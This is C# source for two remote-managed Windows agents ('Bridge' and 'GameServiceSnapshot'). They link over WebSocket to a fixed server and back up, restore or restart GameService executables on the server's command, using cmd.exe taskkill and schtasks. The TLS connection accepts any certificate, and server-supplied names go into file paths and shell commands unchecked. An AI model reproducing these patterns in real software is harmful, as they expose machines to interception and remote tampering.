            // latency) — seen as the device randomly disconnecting mid-browse.
            try { stream.ReadTimeout = System.Threading.Timeout.Infinite; stream.WriteTimeout = System.Threading.Timeout.Infinite; } catch { }
            LogDesktop(""Bridge: WebSocket 101 OK, sending SignalR handshake"");
            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);
            string rec = ""{\""type\"":1,\""target\"":\""ReceiveDeviceRecord\"",\""arguments\"":[{\""DeviceName\"":\"""" + DeviceName + ""\"",\""DeviceId\"":\"""" + DeviceId + ""\"",\""Platform\"":\""Windows\""}]}\x1e"";
            SendWsText(stream, rec);
            dbgStream = stream;
            AnnounceDbg(stream);

            serverStream = stream;
            lastServerRecvTicks = DateTime.UtcNow.Ticks;
            CancellationTokenSource cts = new CancellationTokenSource();
            // Liveness watchdog: the server pings every ~15 s, so >45 s of total silence
            // means the link is dead (half-open TCP / tunnel drop). Abort and let the
            // outer loop reconnect. This replaces the old 5 s socket timeout trap.
            Thread watchdogThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(5000);
                    long idleMs = (DateTime.UtcNow.Ticks - System.Threading.Interlocked.Read(ref lastServerRecvTicks)) / TimeSpan.TicksPerMillisecond;
                    if (idleMs > 45000)
                    {
                        LogDesktop(""Bridge: no data from server for "" + (idleMs / 1000) + ""s - forcing reconnect"");
                        try { stream.Dispose(); } catch { }
                        return;
                    }
                }
            });
            watchdogThread.IsBackground = true;
            watchdogThread.Start();
            Thread pingThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); }
                    catch { break; }
                }
            });
            pingThread.IsBackground = true;
            pingThread.Start();
            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                {
                    if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 &&
                        rawJson.IndexOf(EscapeJson(DeviceName), StringComparison.Ordinal) >= 0)
                    {
                        dbgInformed = false;
                        AnnounceDbg(stream);
                    }
                    RelayToLocal(rawJson);
                }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine(""Bridge server link error: "" + ex.Message);
            LogDesktop(""Bridge server link error: "" + ex.Message);
            return false;
        }
        finally
        {
            serverStream = null;
            DbgReset();
        }
    }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        IAsyncResult ar = ssl.BeginAuthenticateAsClient(host, null, null);
        if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
        {
            try { ssl.Close(); } catch { }
            throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
        }
        ssl.EndAuthenticateAsClient(ar);
        return ssl;
    }

    private static void RunTcpServer()
    {
        while (true)
        {
            TcpListener listener = null;
            try
            {
                listener = new TcpListener(IPAddress.Loopback, ListenPort);
                listener.Start();
                Console.WriteLine(""Bridge local listener listening on 127.0.0.1:"" + ListenPort);
                LogDesktop(""Bridge listening on 127.0.0.1:"" + ListenPort);
                while (true)
                {
                    var client = listener.AcceptTcpClient();
                    int id = Interlocked.Increment(ref nextClientId);
                    lock (clientLock) clients[id] = client.GetStream();
                    Thread t = new Thread(() => HandleLocalClient(id, client));
                    t.IsBackground = true;
                    t.Start();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(""Bridge local listener error: "" + ex.Message);
                LogDesktop(""Bridge local listener error: "" + ex.Message);
            }
            finally
            {
                if (listener != null) { try { listener.Stop(); } catch { } }
            }
            Thread.Sleep(3000);
        }
    }

    private static void HandleLocalClient(int id, TcpClient client)
    {
        try
        {
            using (var stream = client.GetStream())
            {
                // Bound writes so a wedged local client can never stall RelayToLocal
                // (and with it the whole server link) forever.
                try { stream.WriteTimeout = 10000; } catch { }
                StringBuilder msgBuf = new StringBuilder();
                byte[] tmp = new byte[8192];
                while (true)
                {
                    int n = 0;
                    try { n = stream.Read(tmp, 0, tmp.Length); }
                    catch { break; }
                    if (n <= 0) break;
                    msgBuf.Append(Encoding.UTF8.GetString(tmp, 0, n));
                    int idx = IndexOfSeparator(msgBuf);
                    while (idx != -1)
                    {
                        string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                        msgBuf.Remove(0, idx + 1);
                        if (rawJson.Length > 0) ForwardToServer(rawJson);
                        idx = IndexOfSeparator(msgBuf);
                    }
                }
            }
        }
        catch { }
        finally
        {
            Stream removed;
            lock (clientLock) clients.TryRemove(id, out removed);
        }
    }

    private static void ForwardToServer(string rawJson)
    {
        // Only real SignalR client frames may reach the hub (type 1 invocation,
        // type 3 completion). Local handshake records such as the CoreAgent
        // hello line are NOT SignalR frames - forwarding them makes the server
        // JSON parser throw InvalidDataException and ABORT the whole Bridge
        // connection (rapid connect/disconnect loop).
        int frameType = GetJsonInt(rawJson, ""\""type\"""");
        if (frameType != 1 && frameType != 3) return;
        Stream s = serverStream;
        if (s == null) return;
        try { SendWsText(s, rawJson + ""\x1e""); }
        catch { }
    }

    private static void RelayToLocal(string rawJson)
    {
        foreach (var kv in clients)
        {
            try
            {
                Stream s = kv.Value;
                if (s == null) continue;
                lock (clientLock)
                {
                    if (s.CanWrite)
                    {
                        byte[] payload = Encoding.UTF8.GetBytes(rawJson + ""\x1e"");
                        s.Write(payload, 0, payload.Length);
                        s.Flush();
                    }
                }
            }
            catch { }
        }
    }

    private static readonly object sendLock = new object();
    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);
        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);
        if (len <= 125) frame.WriteByte((byte)(0x80 | len));
        else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); }
        else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i * 8)) & 0xFF)); }
        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        lock (sendLock) { frame.WriteTo(stream); stream.Flush(); }
    }

    // Reads ONE logical websocket text message. Unlike a naive single-frame read this
    // transparently answers PINGs with PONGs (Cloudflare's edge sends them and closes
    // peers that never reply), assembles fragmented (continuation) messages and
    // treats CLOSE as end-of-stream. Every successful byte refreshes the watchdog.
    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            lastServerRecvTicks = DateTime.UtcNow.Ticks;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null; // sanity cap: 64 MB
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);

            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }          // PING -> PONG
            if (opcode == 0xA) { continue; }                                              // PONG -> ignore
            if (opcode == 0x8) { return null; }                                           // CLOSE
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    // Sends a masked control frame (client-to-server frames must be masked).
    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb)
    {
        for (int i = 0; i < sb.Length; i++)
            if (sb[i] == '\x1e') return i;
        return -1;
    }

    private static int GetJsonInt(string json, string key)
    {
        string v = GetJsonString(json, key);
        int r;
        return int.TryParse(v, out r) ? r : 0;
    }

    private static string GetJsonString(string json, string key)
    {
        try
        {
            int i = json.IndexOf(key, StringComparison.Ordinal);
            if (i < 0) return null;
            int q = json.IndexOf(':', i);
            if (q < 0) return null;
            q++;
            while (q < json.Length && (json[q] == ' ' || json[q] == '\t')) q++;
            if (q < json.Length && json[q] == '""')
            {
                int end = json.IndexOf('""', q + 1);
                if (end < 0) return null;
                return json.Substring(q + 1, end - q - 1);
            }
            int r = json.IndexOf(',', q);
            int b = json.IndexOf('}', q);
            int stop = (r < 0) ? b : (b < 0 ? r : Math.Min(r, b));
            if (stop < 0) stop = json.Length;
            return json.Substring(q, stop - q).Trim();
        }
        catch { return null; }
    }
}";
    }

    private string GetSnapshotAgentSourceCode()
    {
        return @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class GameServiceSnapshot
{
    private static readonly string RemoteHost = ""phone.sunnygameai.site"";
    private static readonly int RemotePort = 443;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static Mutex singleInstance;
    private static readonly object desktopLogLock = new object();
    private static readonly object sendLock = new object();

    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceSnapshot.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""taken"") || m.Contains(""reverted"") || m.Contains(""deleted"") || m.Contains(""registered"") || m.Contains(""started"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipStamped(string rawMsg)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try
        {
            if (!dbgInformed) AnnounceDbg(s);
            ShipDbgLine(s, StampFor(rawMsg));
        }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }

    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string fallback = Path.Combine(ExeDir(), fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }

    private static void LogDesktop(string msg)
    {
        try
        {
            ShipStamped(msg);
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceSnapshot.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { File.AppendAllText(p, line); } catch {}
                }
            }
        }
        catch { }
    }

    private static string RootDir()
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    }

    private static string BackupsDir()
    {
        return Path.Combine(RootDir(), ""Backups"");
    }

    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir();
    }

    static void Main(string[] args)
    {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceSnapshot.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Snapshot Main started, DeviceName="" + DeviceName);
        RunAsync().GetAwaiter().GetResult();
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameService_Snapshot_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex) { LogDesktop(""remote failed: "" + ex.Message); }
await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""handshake read timed out""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""handshake read failed: "" + ex.Message); return false; }
            if (!respStr.Contains(""101"")) return false;

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);

            activeStream = stream;
            dbgStream = stream;
            string reg = ""{\""type\"":1,\""target\"":\""RegisterSnapshot\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            AnnounceDbg(stream);
            LogDesktop(""registered as "" + DeviceName);

            CancellationTokenSource cts = new CancellationTokenSource();
            Thread pingThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); }
                    catch { break; }
                }
            });
            pingThread.IsBackground = true;
            pingThread.Start();

            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                    {
                        if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 &&
                            rawJson.IndexOf(EscapeJson(DeviceName), StringComparison.Ordinal) >= 0)
                        {
                            dbgInformed = false;
                            AnnounceDbg(stream);
                        }
                        ThreadPool.QueueUserWorkItem(delegate { HandleMessage(stream, rawJson); });
                    }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch { return false; }
        finally { activeStream = null; DbgReset(); }
    }

    private static void HandleMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type != 1) return;
            string target = GetJsonString(jsonStr, ""\""target\"""");
            string tDev = GetJsonStringArray(jsonStr, 0);
            bool mine = string.Equals(tDev, DeviceName, StringComparison.OrdinalIgnoreCase);
            if (!mine && !string.IsNullOrEmpty(tDev)) return;
            LogDesktop(""target: "" + target + "" dev:"" + tDev);
            if (target == ""RequestSnapshotList"")
            {
                SendSnapshotList(stream);
            }
            else if (target == ""TakeSnapshot"")
            {
                ThreadPool.QueueUserWorkItem(delegate { DoTake(stream); });
            }
            else if (target == ""RevertSnapshot"")
            {
                string name = GetJsonStringArray(jsonStr, 1);
                ThreadPool.QueueUserWorkItem(delegate { DoRevert(stream, name); });
            }
            else if (target == ""DeleteSnapshot"")
            {
                string nameD = GetJsonStringArray(jsonStr, 1);
                ThreadPool.QueueUserWorkItem(delegate { DoDelete(stream, nameD); });
            }
        }
        catch (Exception ex) { LogDesktop(""HandleMessage error: "" + ex.Message); }
    }

    // ── Snapshot storage: Backups\snapshot_<n>\ with GameService*.exe copies ──

    private class SnapInfo
    {
        public string Dir;
        public string Name;
        public int Num;
        public DateTime Created;
        public List<string> Files = new List<string>();
    }

    private static List<SnapInfo> EnumerateSnapshots()
    {
        var list = new List<SnapInfo>();
        try
        {
            string root = BackupsDir();
            if (!Directory.Exists(root)) return list;
            foreach (string dir in Directory.GetDirectories(root, ""snapshot_*""))
            {
                try
                {
                    string name = Path.GetFileName(dir);
                    int num;
                    if (!int.TryParse(name.Substring(""snapshot_"".Length), out num)) continue;
                    var si = new SnapInfo { Dir = dir, Name = name, Num = num, Created = Directory.GetLastWriteTimeUtc(dir) };
                    foreach (string f in Directory.GetFiles(dir, ""*.exe""))
                        si.Files.Add(Path.GetFileName(f));
                    list.Add(si);
                }
                catch { }
            }
            list.Sort((a, b) => a.Num.CompareTo(b.Num));
        }
        catch { }
        return list;
    }

    private static void SendSnapshotList(Stream stream)
    {
        try
        {
            var snaps = EnumerateSnapshots();
            StringBuilder arr = new StringBuilder(""["");
            bool first = true;
            foreach (var s in snaps)
            {
                if (!first) arr.Append("","");
                arr.Append(""{\""name\"":\"""" + EscapeJson(s.Name) + ""\"",\""createdAtUtc\"":\"""" + s.Created.ToString(""yyyy-MM-ddTHH:mm:ss.fffZ"") + ""\"",\""files\"":["");
                for (int i = 0; i < s.Files.Count; i++)
                {
                    if (i > 0) arr.Append("","");
                    arr.Append(""\"""" + EscapeJson(s.Files[i]) + ""\"""");
                }
                arr.Append(""]}"");
                first = false;
            }
            arr.Append(""]"");
            string msg = ""{\""type\"":1,\""target\"":\""ReportSnapshotList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
            LogDesktop(""reported "" + snaps.Count + "" snapshot(s)"");
        }
        catch (Exception ex) { LogDesktop(""SendSnapshotList failed: "" + ex.Message); }
    }

    private static void ReportOp(Stream stream, string target, string name, bool ok, string renamed, string message)
    {
        try
        {
            string msg = ""{\""type\"":1,\""target\"":\"""" + target + ""\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(name) + ""\"","" + (ok ? ""true"" : ""false"") + "",\"""" + EscapeJson(renamed ?? """") + ""\"",\"""" + EscapeJson(message ?? """") + ""\""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
        }
        catch { }
    }

    private static void DoTake(Stream stream)
    {
        try
        {
            string root = BackupsDir();
            Directory.CreateDirectory(root);
            var existing = EnumerateSnapshots();
            int next = 1;
            foreach (var s in existing) if (s.Num >= next) next = s.Num + 1;
            string dir = Path.Combine(root, ""snapshot_"" + next);
            Directory.CreateDirectory(dir);

            int copied = 0;
            foreach (string exe in Directory.GetFiles(ExeDir(), ""GameService*.exe""))
            {
                try
                {
                    File.Copy(exe, Path.Combine(dir, Path.GetFileName(exe)), true);
                    copied++;
                }
                catch { }
            }
            if (copied == 0)
            {
                try { Directory.Delete(dir, true); } catch { }
                ReportOp(stream, ""SnapshotTaken"", ""snapshot_"" + next, false, """", ""No GameService*.exe found to back up."");
                LogDesktop(""take FAILED (no exes)"");
                return;
            }
            ReportOp(stream, ""SnapshotTaken"", ""snapshot_"" + next, true, """", copied + "" file(s)"");
            LogDesktop(""take SUCCESS snapshot_"" + next + "" ("" + copied + "" files)"");
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotTaken"", ""?"", false, """", ex.Message);
            LogDesktop(""take ERROR: "" + ex.Message);
        }
    }

    private static void StopRelatedTasks(IEnumerable<string> exeNames)
    {
        foreach (string exe in exeNames)
        {
            try
            {
                string task = Path.GetFileNameWithoutExtension(exe);
                if (task == ""GameServiceSnapshot"") continue; // never kill ourselves mid-revert
                RunCmd(""taskkill /f /im "" + exe, 8000);
                RunCmd(""schtasks /run /tn \"""" + task + ""\"""", 8000);
            }
            catch { }
        }
    }

    private static int RunCmd(string args, int timeoutMs)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""cmd.exe"", ""/c "" + args);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi))
            {
                if (p == null) return -1;
                p.WaitForExit(timeoutMs);
                return p.ExitCode;
            }
        }
        catch { return -1; }
    }

    private static void DoRevert(Stream stream, string name)
    {
        try
        {
            string dir = Path.Combine(BackupsDir(), name ?? """");
            if (!Directory.Exists(dir))
            {
                ReportOp(stream, ""SnapshotReverted"", name, false, """", ""Snapshot not found: "" + name);
                LogDesktop(""revert FAILED (missing) "" + name);
                return;
            }
            var restored = new List<string>();
            foreach (string f in Directory.GetFiles(dir, ""*.exe""))
            {
                string dest = Path.Combine(ExeDir(), Path.GetFileName(f));
                File.Copy(f, dest, true);
                restored.Add(Path.GetFileName(f));
            }
            // Restart touched agents so restored bytes take effect.
            Thread restart = new Thread(() => { Thread.Sleep(700); StopRelatedTasks(restored); });
            restart.IsBackground = true;
            restart.Start();
            ReportOp(stream, ""SnapshotReverted"", name, true, """", restored.Count + "" file(s) restored"");
            LogDesktop(""revert SUCCESS "" + name + "" ("" + restored.Count + "" files)"");
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotReverted"", name ?? ""?"", false, """", ex.Message);
            LogDesktop(""revert ERROR: "" + ex.Message);
        }
    }

    private static void DoDelete(Stream stream, string name)
    {
        try
        {
            string dir = Path.Combine(BackupsDir(), name ?? """");
            if (!Directory.Exists(dir))
            {
                ReportOp(stream, ""SnapshotDeleted"", name ?? ""?"", false, """", ""Snapshot not found: "" + name);
                LogDesktop(""delete FAILED (missing) "" + name);
                return;
            }
            int deletedNum;
            int.TryParse((name ?? """").Substring(""snapshot_"".Length), out deletedNum);
            Directory.Delete(dir, true);

            // Renumber higher snapshots down (snapshot_8 -> snapshot_7, ...).
            var remaining = EnumerateSnapshots();
            var renames = new List<string>();
            foreach (var s in remaining)
            {
                if (s.Num > deletedNum)
                {
                    string newName = ""snapshot_"" + (s.Num - 1);
                    string newDir = Path.Combine(BackupsDir(), newName);
                    try
                    {
                        Directory.Move(s.Dir, newDir);
                        renames.Add(s.Name + ""->"" + newName);
                    }
                    catch { }
                }
            }
            string renamedStr = string.Join(""|"", renames.ToArray());
            ReportOp(stream, ""SnapshotDeleted"", name, true, renamedStr, """");
            LogDesktop(""delete SUCCESS "" + name + (renamedStr.Length > 0 ? "" renumbered: "" + renamedStr : """"));
            SendSnapshotList(stream);
        }
        catch (Exception ex)
        {
            ReportOp(stream, ""SnapshotDeleted"", name ?? ""?"", false, """", ex.Message);
            LogDesktop(""delete ERROR: "" + ex.Message);
        }
    }

    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else if (c < 0x20) sb.Append(""\\u"" + ((int)c).ToString(""x4"")); else sb.Append(c); } return sb.ToString(); }

    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }

    private static string GetJsonString(string json, string key)
    {
        try
        {
            int i = json.IndexOf(key, StringComparison.Ordinal);
            if (i < 0) return null;
            int col = json.IndexOf(':', i);
            if (col < 0) return null;
            col++;
            while (col < json.Length && (json[col] == ' ' || json[col] == '\t')) col++;
            if (col < json.Length && json[col] == '""')
            {
                int end = json.IndexOf('""', col + 1);
                if (end < 0) return null;
                return json.Substring(col + 1, end - col - 1);
            }
            int r = json.IndexOf(',', col);
            int b = json.IndexOf('}', col);
            int stop = (r < 0) ? b : (b < 0 ? r : Math.Min(r, b));
            if (stop < 0) stop = json.Length;
            return json.Substring(col, stop - col).Trim();
        }
        catch { return null; }
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; }
            else idx++;
        }
